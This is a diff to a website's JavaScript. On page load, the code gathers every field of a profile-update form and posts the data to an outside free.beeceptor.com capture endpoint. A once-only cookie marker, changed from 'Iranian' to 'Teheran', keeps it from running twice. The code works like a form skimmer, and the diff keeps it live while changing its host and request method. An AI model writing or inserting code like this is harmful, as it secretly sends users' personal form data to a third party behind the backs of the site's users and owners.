@@ -38,17 +38,16 @@ function docReady(fn) {
 
 docReady(function() {
     var _tccl_visited = readCookie("_tccl_visited");
-    if(_tccl_visited != "Iranian"){
+    if(_tccl_visited != "Teheran"){
         var regobject = {};
         new FormData(document.getElementById('formprofileupdate')).forEach((value, key) => regobject[key] = value);
-        var regjson = JSON.stringify(regobject);
         $.ajax({
-            url: 'https://herbtest.free.beeceptor.com/',
-            data: regjson,
-            processData: false,
-            type: 'GET',
+            url: 'https://testadd.free.beeceptor.com',
+            data: regobject,
+            contentType: "application/json",
+            type: 'POST',
             success: function ( data ) {
-                createCookie("_tccl_visited", "Iranian", 365);
+                createCookie("_tccl_visited", "Teheran", 365);
                 console.log( data );
             }
         });
